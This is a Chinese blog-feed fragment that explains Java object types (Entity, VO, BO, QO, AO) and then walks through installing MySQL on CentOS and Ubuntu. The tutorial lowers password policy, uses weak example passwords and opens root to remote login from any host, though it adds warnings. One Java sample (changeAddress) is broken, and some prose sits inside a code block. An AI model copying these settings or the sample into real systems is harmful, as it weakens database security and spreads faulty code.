<h1 id="五、Entity（实体）"><a href="#五、Entity（实体）" class="headerlink" title="五、Entity（实体）"></a>五、Entity（实体）</h1><p>实体，顾名思义，实体需要给予一个唯一标识，以区分其它实体，而值对象VO不需要。<br>实体应该有一个生命周期，是有状态的，例如抽象订单有一个唯一识别号，订单有从下单创建到最后交货完成的生命周期，实体对象的状态可以变化。</p>
<ul>
<li><p>与VO(值对象)的区别：<br>只要两个实体对象的唯一标识相等，就判断两个对象相等，即使其他属性不同。可以修改实体状态。<br>而VO (值对象）没有标识，所有属性相等，才判断两个对象相等。只能创建新的值对象，不能修改。</p>
</li>
<li><p>与PO（持久化对象）的区别：<br>PO与数据表的一条记录对应，通常为了方便存储，会给PO赋予了一个主键ID。<br>从而，PO也像实体一样具有了标识，Martin Flowler称之为委派标识，区别于实体标识。<br>例如身份证号作为身份证的实体标识，唯一区分其他身份证。但是存储在数据库中，依然可能分配自增主键ID(1,2,3,…)。若值对象需要持久化，也会被分配委派标识，方便查询，或与外键关联。<br>实体的标识与业务有关，PO的委派标识仅方便存储，与技术有关。</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Entity</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">getId</span><span class="params">()</span>&#123;<span class="keyword">return</span> id;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="六、VO-value-object-值对象）"><a href="#六、VO-value-object-值对象）" class="headerlink" title="六、VO(value object 值对象）"></a>六、VO(value object 值对象）</h1><p>值对象，通常用于业务层之间的数据传递，仅仅包含自身的数据。<br>与实体的区别是，没有唯一标识，无生命周期，内部值是不变的。<br>与PO的区别是，PO只在数据层，作为存储。VO在商业逻辑层和表示层，作为一个概念整体。</p>
<p>值对象通常是小而简单的对象，如货币、日期或地址这样的对象，判断相等时不根据标识ID。比如，年月日相同，就判断这两个对象相等。<br>值对象易于创建，参数传递时通常是传递值，而不是传递引用。<br>值对象不应被持久化，这个对象被创建后只能被引用，当没有引用时交给垃圾回收自动处理。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//示例代码,比如Address这样无唯一标识的就是值对象</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Address</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String country;</span><br><span class="line">    <span class="keyword">private</span> String province;</span><br><span class="line">    <span class="keyword">private</span> String city;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Address</span><span class="params">(String country, String province, String city)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.country= country;</span><br><span class="line">        <span class="built_in">this</span>.province= province;</span><br><span class="line">        <span class="built_in">this</span>.city= city;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略equals方法</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用值对象，若要修改值对象，值对象不用维护，直接创建一个全新的Address对象</span></span><br><span class="line"><span class="comment">//原对象直接被抛弃，而不是在原对象上进行修改</span></span><br><span class="line"><span class="keyword">public</span> Address <span class="title function_">changeAddress</span><span class="params">(String newCity, String newProvince, String newCity)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Address</span>(newCity, newProvince, newCity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>理解了VO的意思，也就明白了，某些DTO也是一种值对象。历史上，在Martin Flowler称“值对象”的术语，在J2EE社团中称为“数据传输对象”，这在设计模式界引起了一场混乱。</p>
<h1 id="七、VO（-View-Object-显示层对象）"><a href="#七、VO（-View-Object-显示层对象）" class="headerlink" title="七、VO（ View Object 显示层对象）"></a>七、VO（ View Object 显示层对象）</h1><p>Value Object和View Object的简写都是VO，可能容易弄混。View Object的含义是通常是Web向模板渲染引擎层传输的对象。《阿里巴巴开发手册》中建议把输出的显示层对象命名为VO。当然，也有人把这个对象命名为DTO作为传输。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Controller层</span></span><br><span class="line"><span class="keyword">public</span> HttpResult <span class="title function_">list</span><span class="params">(<span class="meta">@RequestBody</span> XXParam param)</span>&#123;</span><br><span class="line">    HttpResult vo=HttpResultUtils.convert(XXDTO);</span><br><span class="line">    <span class="keyword">return</span> vo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于很多页面需要额外数据，比如错误码、提示信息、分页信息等，查询的DTO之后需要再封装成View Object 显示层对象再显示出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	errcode: <span class="string">&quot;00000&quot;</span>,</span><br><span class="line">	errmsg: <span class="string">&quot;ok&quot;</span>,</span><br><span class="line">	data: &#123;</span><br><span class="line">		pageNum: <span class="number">1</span>, </span><br><span class="line">		pageSize: <span class="number">10</span>, </span><br><span class="line">		totalPage: <span class="number">1</span>, </span><br><span class="line">		total: <span class="number">4</span>, </span><br><span class="line">		list: [...]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 八、BO(business object 业务对象)</span><br><span class="line"></span><br><span class="line">业务对象(business object，BO)是企业领域用来描述业务概念的语义对象。这是一个非常宽泛的定义。</span><br><span class="line"></span><br><span class="line">业务对象，就是把业务逻辑封装为一个对象（注意是对象本身的业务逻辑，而不是协调其它对象的逻辑），这个业务对象可以包括一个或多个其它的对象。</span><br><span class="line"></span><br><span class="line">一些业务建模方法使用了业务对象的概念，如SAP定义的公共事业模型，就将客户相关信息抽象为合作伙伴、合同账户、合同、连接对象等业务对象。它是站在一个高层次角度的表述，并形成了高度抽象的业务概念。</span><br><span class="line"></span><br><span class="line">如果系统采用经典三层架构，可认为业务对象就是定义在业务逻辑层中封装了业务逻辑的对象。</span><br><span class="line"></span><br><span class="line">一般，实现业务的通常方式之一，是包括数据而不包含行为的领域对象（所谓“贫血模型”）+Service类来实现的。其中，业务逻辑是包含在service层里，随着业务不断演进，service类里的逻辑越来越复杂，越来越重，不利于重用。</span><br><span class="line"></span><br><span class="line">而在《面向领域驱动设计》中，将对象本身的逻辑也封装在对象中（所谓“充血模型”），而service类仅仅起协调作用，比如对领域对象的调用及其它工具的调用，不包含业务本身的逻辑，是轻量级的薄薄一层，名为应用服务层。当业务不断演进时，通常只需要关注业务对象（BO）即可，而应用层面较少变化。</span><br><span class="line">因此，业务对象，也是领域对象（Domain Object）的另一说法。</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="comment">//示例代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="comment">//对象自身的业务逻辑</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">changePassword</span><span class="params">(String newPassword)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.setPassword(newPassword);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//省略getter和setter方法</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>业务对象（BO）通常是实体，或者是聚合根，包含多个实体或值对象，内部实现业务逻辑。</p>
<p>此对象在实际使用中有不一样的理解，有的团队将 BO 当作 Service 返回给上层的 “专用 DTO” 使用；而有的团队则当作 Service 层内保存中间信息数据的 “DTO” 或者上下文对象来使用（建议采用这种理解）。</p>
<h1 id="九、QO-query-object-查询对象）"><a href="#九、QO-query-object-查询对象）" class="headerlink" title="九、QO(query object 查询对象）"></a>九、QO(query object 查询对象）</h1><p>数据查询对象，各层接收上层的查询请求。注意，【强制】如果超过2个参数的查询封装，则禁止使用Map类传输。<br>查询对象用于 Controller 层方法接收客户端的请求参数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyQO</span> &#123;</span><br><span class="line">  <span class="keyword">private</span> String param1;</span><br><span class="line">  <span class="keyword">private</span> String param2;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@PostMapping(&quot;/post&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">post</span><span class="params">(<span class="meta">@RequestBody</span> MyQO qo)</span> &#123;</span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>以创建简历对象为例，简历可分为教育经历、工作经历、项目经历。先填写查询对象的信息，转换为业务对象，分成不同的表进行存储。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">MyBO</span> <span class="variable">bo</span> <span class="operator">=</span> service.createBO(qo);<span class="comment">//创建业务对象</span></span><br><span class="line">bo.dosomething();</span><br><span class="line"><span class="comment">//将业务对象存储在不同的表中</span></span><br><span class="line"><span class="type">MyPO</span> <span class="variable">po1</span> <span class="operator">=</span> service.createPO1(bo);</span><br><span class="line">dao1.save(po1);</span><br><span class="line"><span class="type">MyPO</span> <span class="variable">po2</span> <span class="operator">=</span> service.createPO2(bo);</span><br><span class="line">dao2.save(po2);</span><br><span class="line"><span class="type">MyPO</span> <span class="variable">po3</span> <span class="operator">=</span> service.createPO3(bo);</span><br><span class="line">dao3.save(po3);</span><br></pre></td></tr></table></figure>

<h1 id="十、AO-Application-Object-应用对象"><a href="#十、AO-Application-Object-应用对象" class="headerlink" title="十、AO (Application Object 应用对象)"></a>十、AO (Application Object 应用对象)</h1><p>一般用在控制层和服务层之间。有些团队会将前端查询的属性和保存的属性几乎一致的对象封装为 AO，如读取用户属性传给前端，用户在前端编辑了用户属性后传回后端。这种用法将 AO 用做 Param 和 VO 或 Param 和 DTO 的组合。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Controller层</span></span><br><span class="line"><span class="keyword">public</span> HttpResult <span class="title function_">update</span><span class="params">(<span class="meta">@RequestBody</span> XXAO ao1)</span>&#123;</span><br><span class="line">	<span class="type">XXAO</span> <span class="variable">ao2</span> <span class="operator">=</span> XXService.update(ao1);</span><br><span class="line">    <span class="type">HttpResult</span> <span class="variable">vo</span> <span class="operator">=</span> HttpResultUtils.convert(ao2);</span><br><span class="line">    <span class="keyword">return</span> vo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="十一、总结"><a href="#十一、总结" class="headerlink" title="十一、总结"></a>十一、总结</h1><p>POJO：简单Java对象，它没有任何限制和特定的约定，是一个普通的Java对象。<br>DTO：数据传输对象，它是一个数据传输结构，通常用于不同进程间的数据传输，在不同层之间传递数据的对象。<br>DAO：数据访问对象，是一个数据访问模式，在应用程序中它通常扮演着对数据库的访问。<br>PO：持久化对象，通常指ORM（对象关系映射）中映射的数据库表对应的实体类。<br>BO：业务对象，是应用程序中业务逻辑的实现。<br>VO：值对象，它是一个用于存储数据的对象，通常是与UI&#x2F;界面模型相关的对象。<br>QO（Query）：查询对象，它主要用于定义查询条件和规则，用于接收前端传递的查询条件参数。<br>ENTITY：实体对象，是一个与业务相关的对象，通常是与应用程序领域模型相关的对象。<br>Param：表示请求参数，用于接收前端传递的参数<br>Command：表示命令，用于接收前端传递的命令参数</p>
<blockquote>
<p>各对象的命名习惯：</p>
</blockquote>
<p>PO通常放在名为bean、entity、model目录中。<br>DAO本身就是一层，通常是DAO、mapper、repository目录。<br>BO通常在service、manager、business，domain，model目录中。<br>DTO通常在command、representation、DTO目录中。</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux部署软件环境</title>
    <url>/2024/03/28/LinuxInstall/</url>
    <content><![CDATA[<h1 id="学会在Linux部署各类软件"><a href="#学会在Linux部署各类软件" class="headerlink" title="学会在Linux部署各类软件"></a>学会在Linux部署各类软件</h1><h2 id="MySQL数据库管理系统安装部署【简单】"><a href="#MySQL数据库管理系统安装部署【简单】" class="headerlink" title="MySQL数据库管理系统安装部署【简单】"></a>MySQL数据库管理系统安装部署【简单】</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>MySQL数据库管理系统（后续简称MySQL），是一款知名的数据库系统，其特点是：轻量、简单、功能丰富。</p>
<p>MySQL数据库可谓是软件行业的明星产品，无论是后端开发、大数据、AI、运维、测试等各类岗位，基本上都会和MySQL打交道。</p>
<p>让我们从MySQL开始，进行实战的Linux软件安装部署。</p>
<p>本次课程分为2个版本进行安装：</p>
<p>MySQL 5.7版本安装<br>MySQL 8.x版本安装</p>
<blockquote>
<p>由于MySQL5.x和8.x各自有许多使用者，所以这两个版本我们都演示安装一遍</p>
</blockquote>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>MySQL的安装过程中，除了会使用Linux命令外，还会使用到少量的数据库专用的：SQL语句</p>
<h3 id="MySQL5-7版本在CentOS系统安装"><a href="#MySQL5-7版本在CentOS系统安装" class="headerlink" title="MySQL5.7版本在CentOS系统安装"></a>MySQL5.7版本在CentOS系统安装</h3><blockquote>
<p>注意：安装操作需要root权限</p>
</blockquote>
<h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul>
<li>配置yum仓库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新密钥</span></span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装Mysql yum库</span></span><br><span class="line">rpm -Uvh http://repo.mysql.com//mysql57-community-release-el7-7.noarch.rpm</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlOne.png"></p>
<blockquote>
<p>由于MySQL并不在CentOS的官方仓库中，所以我们通过上述rpm命令：<br>导入MySQL仓库的密钥<br>配置MySQL的yum仓库</p>
</blockquote>
<ul>
<li>使用yum安装MySQL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum安装Mysql</span></span><br><span class="line">yum -y install mysql-community-server</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwo.png"></p>
<ul>
<li>安装完成后，启动MySQL并配置开机自启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld		# 启动</span><br><span class="line">systemctl enable mysqld		# 开机自启</span><br></pre></td></tr></table></figure>
<blockquote>
<p>MySQL安装完成后，会自动配置为名称叫做：mysqld的服务，可以被systemctl所管理</p>
</blockquote>
<ul>
<li>检查MySQL的运行状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlThree.png"></p>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>主要配置管理员用户root的密码以及配置允许远程登录的权限。</p>
<ul>
<li>获取MySQL的初始密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过grep命令，在/var/log/mysqld.log文件中，过滤temporary password关键字，得到初始密码</span></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlFour.png"></p>
<ul>
<li>登陆MySQL数据库系统</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解释</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u，登陆的用户，MySQL数据库的管理员用户同Linux一样，是root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p，表示使用密码登陆</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行完毕后输入刚刚得到的初始密码，即可进入MySQL数据库</span></span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlFive.png"></p>
<ul>
<li>修改root用户密码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 在MySQL控制台内执行</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;	<span class="comment">-- 密码需要符合：大于8位，有大写字母，有特殊符号，不能是连续的简单语句如123，abc</span></span><br></pre></td></tr></table></figure>
<ul>
<li>[扩展]，配置root的简单密码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 如果你想设置简单密码，需要降低Mysql的密码安全级别</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password_policy<span class="operator">=</span>LOW; # 密码安全级别低</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password_length<span class="operator">=</span><span class="number">4</span>;	 # 密码长度最低<span class="number">4</span>位即可</span><br><span class="line"></span><br><span class="line"># 然后就可以用简单密码了（课程中使用简单密码，为了方便，生产中不要这样）</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;简单密码&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>[扩展]，配置root运行远程登录<blockquote>
<p>默认情况下，root用户是不运行远程登录的，只允许在MySQL所在的Linux服务器登陆MySQL系统<br>请注意，允许root远程登录会带来安全风险</p>
</blockquote>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 授权root远程登录</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> root@&quot;IP地址&quot; identified <span class="keyword">by</span> <span class="string">&#x27;密码&#x27;</span> <span class="keyword">with</span> <span class="keyword">grant</span> option;  </span><br><span class="line"># IP地址即允许登陆的IP地址，也可以填写<span class="operator">%</span>，表示允许任何地址</span><br><span class="line"># 密码表示给远程登录独立设置密码，和本地登陆的密码可以不同</span><br><span class="line"></span><br><span class="line"># 刷新权限，生效</span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>
<ul>
<li>退出MySQL控制台页面</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 退出命令</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"># 或者通过快捷键退出：ctrl <span class="operator">+</span> d</span><br></pre></td></tr></table></figure>

<ul>
<li>检查端口<br>MySQL默认绑定了3306端口，可以通过端口占用检查MySQL的网络状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anp | grep 3306</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlSix.png"><br>至此，MySQL就安装完成并可用了，请妥善保存好MySQL的root密码。</p>
<h3 id="MySQL8-0版本在CentOS系统安装"><a href="#MySQL8-0版本在CentOS系统安装" class="headerlink" title="MySQL8.0版本在CentOS系统安装"></a>MySQL8.0版本在CentOS系统安装</h3><blockquote>
<p>注意：安装操作需要root权限</p>
</blockquote>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><ul>
<li>配置yum仓库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新密钥</span></span><br><span class="line">rpm --import https://repo.mysql.com/RPM-GPG-KEY-mysql-2022</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装Mysql8.x版本 yum库</span></span><br><span class="line">rpm -Uvh https://dev.mysql.com/get/mysql80-community-release-el7-2.noarch.rpm</span><br></pre></td></tr></table></figure>

<ul>
<li>使用yum安装MySQL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">yum安装Mysql</span></span><br><span class="line">yum -y install mysql-community-server</span><br></pre></td></tr></table></figure>

<ul>
<li>安装完成后，启动MySQL并配置开机自启动</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl start mysqld		# 启动</span><br><span class="line">systemctl enable mysqld		# 开机自启</span><br></pre></td></tr></table></figure>

<blockquote>
<p>MySQL安装完成后，会自动配置为名称叫做：mysqld的服务，可以被systemctl所管理</p>
</blockquote>
<ul>
<li>检查MySQL的运行状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">systemctl status mysqld</span><br></pre></td></tr></table></figure>

<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>主要修改root密码和允许root远程登录</p>
<ul>
<li>获取MySQL的初始密码</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">通过grep命令，在/var/log/mysqld.log文件中，过滤temporary password关键字，得到初始密码</span></span><br><span class="line">grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br></pre></td></tr></table></figure>
<ul>
<li>登录MySQL数据库系统</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行</span></span><br><span class="line">mysql -uroot -p</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">解释</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-u，登陆的用户，MySQL数据库的管理员用户同Linux一样，是root</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-p，表示使用密码登陆</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">执行完毕后输入刚刚得到的初始密码，即可进入MySQL数据库</span></span><br></pre></td></tr></table></figure>

<ul>
<li>修改root密码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;	<span class="comment">-- 密码需要符合：大于8位，有大写字母，有特殊符号，不能是连续的简单语句如123，abc</span></span><br></pre></td></tr></table></figure>

<ul>
<li>[扩展]，配置root的简单密码</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password.policy<span class="operator">=</span><span class="number">0</span>;		# 密码安全级别低</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> validate_password.length<span class="operator">=</span><span class="number">4</span>;		# 密码长度最低<span class="number">4</span>位即可</span><br></pre></td></tr></table></figure>

<ul>
<li>允许root远程登录，并设置远程登录密码</li>
</ul>
<blockquote>
<p>默认情况下，root用户是不运行远程登录的，只允许在MySQL所在的Linux服务器登陆MySQL系统</p>
</blockquote>
<p>请注意，允许root远程登录会带来安全风险</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 第一次设置root远程登录，并配置远程密码使用如下<span class="keyword">SQL</span>命令</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;密码!&#x27;</span>;	<span class="comment">-- 密码需要符合：大于8位，有大写字母，有特殊符号，不能是连续的简单语句如123，abc</span></span><br><span class="line"></span><br><span class="line"># 后续修改密码使用如下<span class="keyword">SQL</span>命令</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure>

<ul>
<li>退出MySQL控制台页面</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 退出命令</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line"># 或者通过快捷键退出：ctrl <span class="operator">+</span> d</span><br></pre></td></tr></table></figure>

<ul>
<li>检查端口<br>MySQL默认绑定了3306端口，可以通过端口占用检查MySQL的网络状态</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netstat -anp | grep 3306</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlSeven.png"><br>至此，MySQL就安装完成并可用了，请妥善保存好MySQL的root密码。</p>
<h3 id="MySQL5-7版本在Ubuntu（WSL环境）系统安装"><a href="#MySQL5-7版本在Ubuntu（WSL环境）系统安装" class="headerlink" title="MySQL5.7版本在Ubuntu（WSL环境）系统安装"></a>MySQL5.7版本在Ubuntu（WSL环境）系统安装</h3><blockquote>
<p>课程中配置的WSL环境是最新的Ubuntu22.04版本，这个版本的软件商店内置的MySQL是8.0版本</p>
</blockquote>
<p>所以我们需要额外的步骤才可以安装5.7版本的MySQL</p>
<p>安装操作需root权限，你可以：</p>
<ul>
<li>通过 sudo su -，切换到root用户</li>
<li>或在每一个命令前，加上sudo，用来临时提升权限</li>
</ul>
<h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><ul>
<li>下载apt仓库文件</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">下载apt仓库的安装包，Ubuntu的安装包是.deb文件</span></span><br><span class="line">wget https://dev.mysql.com/get/mysql-apt-config_0.8.12-1_all.deb</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlEight.png"></p>
<ul>
<li>配置apt仓库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用dpkg命令安装仓库</span></span><br><span class="line">dpkg -i mysql-apt-config_0.8.12-1_all.deb</span><br></pre></td></tr></table></figure>

<p>弹出框中选择：ubuntu bionic （Ubuntu18.04系统的代号是bionic，选择18.04的版本库用来安装）<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlNine.png"><br>弹出框中选择：MySQL Server &amp; Cluster<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTen.png"><br>弹出框中选择：mysql-5.7<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlEleven.png"><br>最后选择：ok<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlTwelve.png"></p>
<ul>
<li>更新apt仓库的信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">首先导入仓库的密钥信息</span></span><br><span class="line">apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 467B942D3A79BD29</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">更新仓库信息</span></span><br><span class="line">apt update</span><br></pre></td></tr></table></figure>

<ul>
<li>检查是否成功配置MySQL5.7的仓库</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-cache policy mysql-server</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlThirty.png"><br>看到如图所示字样，即成功</p>
<ul>
<li>安装MySQL5.7</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">使用apt安装mysql客户端和mysql服务端</span></span><br><span class="line">apt install -f -y mysql-client=5.7* mysql-community-server=5.7*</span><br></pre></td></tr></table></figure>

<p>弹出框中输入root密码并选择ok，密码任意，课程中以123456代替<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlFourty.png"><br>再次输入root密码确认<br><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlFivety.png"></p>
<ul>
<li>启动MySQL</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/etc/init.d/mysql start			# 启动</span><br><span class="line">/etc/init.d/mysql stop			# 停止</span><br><span class="line">/etc/init.d/mysql status		# 查看状态</span><br></pre></td></tr></table></figure>
<p><img src="https://web-test1zj.oss-cn-beijing.aliyuncs.com/youyaJieBlog/LinuxInstall/MysqlSixty.png"></p>
<ul>
<li>对MySQL进行初始化</li>
</ul>
